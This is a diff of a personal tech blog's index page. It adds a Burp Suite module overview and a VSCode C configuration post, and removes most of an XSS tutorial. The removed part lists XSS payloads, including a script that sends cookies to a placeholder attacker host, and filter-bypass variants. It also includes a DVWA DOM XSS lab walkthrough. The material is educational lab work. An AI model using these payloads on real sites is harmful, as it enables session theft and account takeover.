@@ -61,6 +61,256 @@
 
   
     
+    <h3 class="article-title"><a href="/2021/02/20/Burp Suite模块介绍/"><span>Burp Suite主要模块功能介绍</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/02/20/Burp Suite模块介绍/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-02-20T15:21:26.347Z">
+          2021-02-20
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="burp-suite模块介绍">Burp Suite模块介绍</h1>
+<h2 id="target">Target</h2>
+<h3 id="主要功能">主要功能</h3>
+<ul>
+<li>显示信息。</li>
+<li>默认记录爬虫所爬行的页面及每个页面的请求头以及相应信息。 ### 使用流程</li>
+</ul>
+<ol type="1">
+<li>在<code>Site map</code>中，将目标站点发送到<code>Scope</code>。</li>
+<li>使用<code>Filter</code>过滤。 &gt; 任意的<code>URL/HTTP</code>请求都可以发送到其他模块。<br />
+## Spider ### 主要功能</li>
+</ol>
+<ul>
+<li>网络爬虫，枚举应用程序的内容和功能。</li>
+<li>在爬行时默认进行漏洞扫描，检测每个访问过的<code>URL</code>。 ### 使用流程</li>
+</ul>
+<ol type="1">
+<li>在<code>Proxy</code>中的<code>Action</code>将请求发送到<code>Spider</code>。</li>
+<li>在<code>Target</code>&gt;<code>Site map</code>中即可看到爬行列表。</li>
+<li>在<code>Spider</code>&gt;<code>Control</code>中可以看到爬行状态，决定开始或者停止。 ## Scanner ### 主要功能</li>
+</ol>
+<ul>
+<li>扫描<code>Web</code>应用程序的安全漏洞。 ### 使用流程 #### 单一URL</li>
+<li>在<code>Proxy</code>中的<code>Action</code>选择<code>Do an active scan</code>即可对该请求的单一<code>URL</code>进行扫描。 #### 全站扫描</li>
+</ul>
+<ol type="1">
+<li>先爬行该网站所有链接。</li>
+<li>在<code>Target</code>中选择目的网站，右键转到<code>Actively Scan this Host</code>。</li>
+<li>跳出向导后，删除不需要扫描的页面，对需要扫描的页面进行确认。</li>
+<li>在<code>Scan queue</code>中可以查看扫描进度，在<code>Results</code>中查看扫描结果。 ## Intruder ### 主要功能</li>
+</ol>
+<ul>
+<li>对<code>Web</code>程序进行自动化攻击。 &gt; 高度可配置的工具，最重要的是配置<code>Attack Type</code>、程序变量以及字典的设置。<br />
+### 使用流程</li>
+</ul>
+<ol type="1">
+<li>将拦截到的请求发送到<code>Intruder</code>，在<code>Intruder</code>&gt;<code>Target</code>中可看到目标网址和访问端口。</li>
+<li>在<code>Positions</code>中进行主要配置。</li>
+<li>配置后，点击<code>Start Attack</code>进行扫描。 ### 具体配置 #### Attack Type |Sniper|对变量依次进行破解| |Battering ram|对变量同时进行破解| |Pitch fork|每个变量将会对应一个字典| |Cluster bomb|每个变量将会对应一个字典，并且交叉破解，尝试每一个组合| #### 程序变量</li>
+</ol>
+<ul>
+<li>使用<code>Clear</code>清除默认变量。</li>
+<li><code>Add</code>设置变量。 #### 字典 ##### Payload Sets</li>
+<li><code>Set</code>针对指定变量进行配置。</li>
+<li><code>Type</code>为<code>Payload</code>的类型。 |Simple list|简单列表| |Runtime file|运行时读取列表| |Numbers|数字列表| |Dates|日期列表| ##### Payload Options</li>
+<li>默认使用<code>Simple list</code>类型。 ##### Payload Processing</li>
+<li>对字符串进行处理。</li>
+<li>支持<code>MD5</code>加密、字符串截取、加入前缀/后缀等。 ##### Payload Encoding</li>
+<li>请求时对某些字符进行<code>URL</code>转码。 #### Option</li>
+</ul>
+<table>
+<thead>
+<tr class="header">
+<th>选项</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Request Engine</td>
+<td>请求引擎设置，设置线程、超时等信息</td>
+</tr>
+<tr class="even">
+<td>Attack Results</td>
+<td>攻击结果显示，设置<code>request</code>、<code>response</code></td>
+</tr>
+<tr class="odd">
+<td>Grep-Match</td>
+<td>识别 <code>response</code>中是否存在此表达式或简单字符串</td>
+</tr>
+<tr class="even">
+<td>Grep-Extract</td>
+<td>通过正则截取<code>response</code>中的信息</td>
+</tr>
+</tbody>
+</table>
+<h2 id="decoder">Decoder</h2>
+<h3 id="主要功能-1">主要功能</h3>
+<ul>
+<li>支持对<code>URL</code>、<code>HEX</code>、<code>HTML</code>等格式字符串进行编码。 ### 使用流程</li>
+</ul>
+<ol type="1">
+<li>在文本框中输入需要编/解码的文本。</li>
+<li>右侧选择操作模式。 ## Comparer ### 主要功能</li>
+</ol>
+<ul>
+<li>比较两段字符串的差异。 ### 使用流程</li>
+</ul>
+<ol type="1">
+<li>选择直接加载文本或者将需要比对的文本发送到<code>Comparer</code>。</li>
+<li>通过<code>Select item 1</code>和<code>Select item 2</code>选择要比较的两段字符串，点击<code>words</code>开始比较。 ## Repeater ### 主要功能</li>
+</ol>
+<ul>
+<li>编辑<code>HTTP</code>请求。 ### 使用流程</li>
+</ul>
+<ol type="1">
+<li>拦截到请求后发送到<code>Repeater</code>。</li>
+<li>直接在框中修改请求内容。</li>
+<li>点击<code>Send</code>发送请求，得到的回复在<code>Response</code>显示。</li>
+</ol>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/public/categories/blog/">blog</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/public/tags/burp/">burp</a><a href="/public/tags/工具/">工具</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/02/20/VSCode-C项目文件配置/"><span>VSCode 配置C/C++项目文件</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/02/20/VSCode-C项目文件配置/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-02-20T15:21:26.347Z">
+          2021-02-20
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="介绍">介绍</h1>
+<ul>
+<li>下学期计网可能要用到<code>C</code>，又不想用之前做算法题的编译器，因为<code>CodeBlocks</code>不好看，<code>Visual Studio</code>又太大了。</li>
+<li>想用一下<code>VSCode</code>，不过我很久没有用过了，于是查了一下<code>C</code>项目的搭建，做一下笔记，以防找不到配置文件。</li>
+</ul>
+<h1 id="步骤">步骤</h1>
+<h2 id="选定文件夹">选定文件夹</h2>
+<ul>
+<li>在<code>资源管理器</code>中选择<code>打开文件夹</code>。</li>
+<li>选好项目的文件路径，此路径即为项目的位置。</li>
+</ul>
+<h2 id="配置文件">配置文件</h2>
+<h3 id="vscode">.vscode</h3>
+<ul>
+<li><code>Ctrl+Shift+P</code>打开设置，选择<code>Tasks:Configure Task</code>即可创建<code>.vscode</code>文件夹。</li>
+</ul>
+<h3 id="launch.json">launch.json</h3>
+<ul>
+<li>代码</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.2.0&quot;</span>,  </span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span>: [  </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;(gdb) Launch&quot;</span>, <span class="comment">// 配置名称，将会在启动配置的下拉菜单中显示</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;cppdbg&quot;</span>,       <span class="comment">// 配置类型，这里只能为cppdbg</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>,    <span class="comment">// 请求配置类型，可以为launch（启动）或attach（附加）  </span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span>: <span class="string">&quot;$&#123;workspaceFolder&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span>,<span class="comment">// 将要进行调试的程序的路径  </span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span>: [],             <span class="comment">// 程序调试时传递给程序的命令行参数，一般设为空即可  </span></span><br><span class="line">            <span class="attr">&quot;stopAtEntry&quot;</span>: <span class="literal">false</span>,   <span class="comment">// 设为true时程序将暂停在程序入口处，一般设置为false  </span></span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span>: <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span>, <span class="comment">// 调试程序时的工作目录，一般为$&#123;workspaceFolder&#125;即代码所在目录 </span></span><br><span class="line">            <span class="attr">&quot;environment&quot;</span>: [],  </span><br><span class="line">            <span class="attr">&quot;externalConsole&quot;</span>: <span class="literal">true</span>, <span class="comment">// 调试时是否显示控制台窗口，一般设置为true显示控制台  </span></span><br><span class="line">            <span class="attr">&quot;MIMode&quot;</span>: <span class="string">&quot;gdb&quot;</span>,  </span><br><span class="line">            <span class="attr">&quot;miDebuggerPath&quot;</span>: <span class="string">&quot;D:\\MinGW\\bin\\gdb.exe&quot;</span>, <span class="comment">// miDebugger的路径，注意这里要与MinGw的路径对应  </span></span><br><span class="line">            <span class="attr">&quot;preLaunchTask&quot;</span>: <span class="string">&quot;gcc&quot;</span>, <span class="comment">// 调试会话开始前执行的任务，一般为编译程序，c++为g++, c为gcc  </span></span><br><span class="line">            <span class="attr">&quot;setupCommands&quot;</span>: [  </span><br><span class="line">                &#123;   </span><br><span class="line">            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Enable pretty-printing for gdb&quot;</span>,  </span><br><span class="line">                    <span class="attr">&quot;text&quot;</span>: <span class="string">&quot;-enable-pretty-printing&quot;</span>,  </span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span>: <span class="literal">true</span>  </span><br><span class="line">                &#125;  </span><br><span class="line">            ]  </span><br><span class="line">        &#125;  </span><br><span class="line">    ]  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>其中<code>miDebuggerPath</code>和<code>preLaunchTask</code>根据自己情况来定。</li>
+</ul>
+<h3 id="tasks.json">tasks.json</h3>
+<ul>
+<li>代码</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;2.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;gcc&quot;</span>, <span class="comment">// 注意对应</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span>: [<span class="string">&quot;-g&quot;</span>,<span class="string">&quot;$&#123;file&#125;&quot;</span>,<span class="string">&quot;-o&quot;</span>,<span class="string">&quot;$&#123;fileBasenameNoExtension&#125;.exe&quot;</span>],    <span class="comment">// 编译命令参数</span></span><br><span class="line">    <span class="attr">&quot;problemMatcher&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;owner&quot;</span>: <span class="string">&quot;cpp&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;fileLocation&quot;</span>: [<span class="string">&quot;relative&quot;</span>, <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span>],</span><br><span class="line">        <span class="attr">&quot;pattern&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;regexp&quot;</span>: <span class="string">&quot;^(.*):(\\d+):(\\d+):\\s+(warning|error):\\s+(.*)$&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;file&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;line&quot;</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="attr">&quot;column&quot;</span>: <span class="number">3</span>,</span><br><span class="line">            <span class="attr">&quot;severity&quot;</span>: <span class="number">4</span>,</span><br><span class="line">            <span class="attr">&quot;message&quot;</span>: <span class="number">5</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>同样<code>command</code>决定是<code>C</code>还是<code>C++</code>，也是看需求而改变。</li>
+</ul>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/public/categories/blog/">blog</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/public/tags/工具/">工具</a><a href="/public/tags/c-c/">c/c++</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
     <h3 class="article-title"><a href="/2021/02/20/XSS漏洞/"><span>XSS漏洞攻击与防御</span></a></h3>
     
   
@@ -93,286 +343,7 @@
 <li>此时恶意代码被执行，用户的信息将会发送到攻击者的服务器，完成攻击。</li>
 <li><img src="https://i.loli.net/2021/02/20/qrFaBfmsYKJRDME.png" /></li>
 </ul>
-<h1 id="漏洞详解">漏洞详解</h1>
-<h2 id="原理">原理</h2>
-<ul>
-<li>使用页面元素，比如<code>&lt;script&gt;JavaScript-Code&lt;/script&gt;</code>包含恶意代码植入，若没有相应的防护，该代码作为呈现部分加入到页面上(评论区)，很可能被识别为合法的页面元素执行。</li>
-</ul>
-<h2 id="攻击方式">攻击方式</h2>
-<ul>
-<li>攻击方式主要有以下三种：
-<ul>
-<li>使用<code>document.cookie</code>发送用户的<code>cookie</code>，攻击者可以用来无账号密码登入用户账号。</li>
-<li>使用<code>addEventListener</code>记录键盘输入，其中可能记录密码等秘密信息。</li>
-<li>构造虚假<code>DOM</code>树，插入虚假登录表单，诱骗用户进入自己构造的钓鱼网站。</li>
-</ul></li>
-</ul>
-<h2 id="常用语句">常用语句</h2>
-<ul>
-<li>打印信息</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(XSS)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>发送<code>cookie</code></li>
-</ul>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location=<span class="string">&#x27;http://ATTACKER-SITE/?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>页面跳转</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">&#x27;http://ATTACKER-SITE/&#x27;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>绕过过滤</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sCript</span>&gt;</span>...<span class="tag">&lt;/<span class="name">scriPt</span>&gt;</span></span><br><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">ipt&gt;...&lt;/scr<span class="tag">&lt;<span class="name">script</span>&gt;</span>ipt&gt;</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;1&#x27;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(\u0061\u006c\u0065\u0072\u0074(<span class="number">1</span>))</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/FileReader/onerror">onerror</a>(<code>event</code>)图片或者视频加载出错时，执行事件<code>event</code>。</p>
-<p><code>eval</code>()可以执行<code>Unicode</code>转义后的语句。</p>
-</blockquote>
-<ul>
-<li>鼠标动作执行</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onmousemove</span>=<span class="string">&#x27;JavaScript-Code&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onmouseover</span>=<span class="string">&#x27;JavaScript-Code&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/GlobalEventHandlers/onmousemove">onmousemove</a>(<code>event</code>)指针在该区域移动时执行事件<code>event</code>。</p>
-<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/GlobalEventHandlers/onmouseover">onmouseover</a>(<code>event</code>)指针覆盖该区域时执行事件<code>event</code>。</p>
-</blockquote>
-<ul>
-<li>手动闭合</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;Your-JavaScript-Code;&quot;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>当插入的语句出现在变量或者其他位置，为了保证语句执行，需要先闭合前一个语句。</p>
-</blockquote>
-<h1 id="漏洞复现">漏洞复现</h1>
-<h2 id="攻击环境">攻击环境</h2>
-<ul>
-<li>根据网上的分类，找到一个比较好的<a target="_blank" rel="noopener" href="http://blog.nsfocus.net/xss-advance/">博客</a>，参考图如下。</li>
-<li><img src="http://blog.nsfocus.net/wp-content/uploads/2017/09/3b58430793944a738ffaf20e4a0a1aed.png" /></li>
-<li>三种分类方法并不是相互冲突的，可以进行组合，为了条理清晰，这里分开介绍(统一使用<code>JSXSS</code>)。</li>
-<li>这里分别使用<code>DVWA</code>的<code>DOM</code>、<code>Reflected</code>、<code>Stored</code>展开演示。</li>
-</ul>
-<h2 id="dom">DOM</h2>
-<h3 id="介绍">介绍</h3>
-<ul>
-<li>每个页面都有自己的<code>DOM</code>树，通过修改<code>DOM</code>树使得恶意脚本被执行。</li>
-<li><code>DOM</code>即<code>Document Object Model</code>文档对象模型，所以后面代码主要注重前端。</li>
-</ul>
-<h3 id="low">Low</h3>
-<h4 id="代码">代码</h4>
-<ul>
-<li>前端</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="handlebars"><span class="xml">            document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">disabled</span>=<span class="string">&#x27;disabled&#x27;</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="handlebars"><span class="xml">        document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;English&#x27;</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;French&#x27;</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;Spanish&#x27;</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;German&#x27;</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;English&quot;</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;French&quot;</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Spanish&quot;</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;German&quot;</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>后端</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No protections, anything goes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h4 id="审计">审计</h4>
-<ul>
-<li>前端将<code>GET</code>上传的<code>default</code>参数加入到<code>&lt;select&gt;</code>元素的选项卡中，每当页面被呈现时，恶意代码就可以运行。</li>
-<li>后端没有做任何防护，意思就是随便注。</li>
-</ul>
-<blockquote>
-<p><code>document.location.href.indexOf(str)</code>返回字符串<code>str</code>第一个字符的下标。</p>
-<p><code>document.location.href.substring(start, end)</code>构造下标从<code>start</code>到<code>end</code>的子串。</p>
-</blockquote>
-<h4 id="攻击">攻击</h4>
-<ul>
-<li>直接在<code>URL</code>中通过修改<code>default</code>参数上传<code>XSS</code>注入。</li>
-<li><img src="https://img-blog.csdnimg.cn/20210220150234700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70" /></li>
-</ul>
-<h3 id="medium">Medium</h3>
-<h4 id="代码-1">代码</h4>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (stripos (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h4 id="审计-1">审计</h4>
-<ul>
-<li>前端代码没变(之后也应该不变)，后端增加了对<code>&lt;script</code>的过滤。</li>
-<li>这里可以使用没有被屏蔽的标签进行注入。</li>
-</ul>
-<h4 id="攻击-1">攻击</h4>
-<ul>
-<li>将<code>&lt;option&gt;</code>和<code>&lt;select&gt;</code>标签闭合，保证<code>img</code>标签可以插入。</li>
-<li><code>Payload</code>如下</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>此时<code>src</code>链接必然找不到图片并且报错，<code>onerror</code>收到后即执行<code>XSS</code>语句。</li>
-<li><img src="https://img-blog.csdnimg.cn/20210220150316748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70" />High</li>
-</ul>
-<h4 id="代码-2">代码</h4>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h4 id="审计-2">审计</h4>
-<ul>
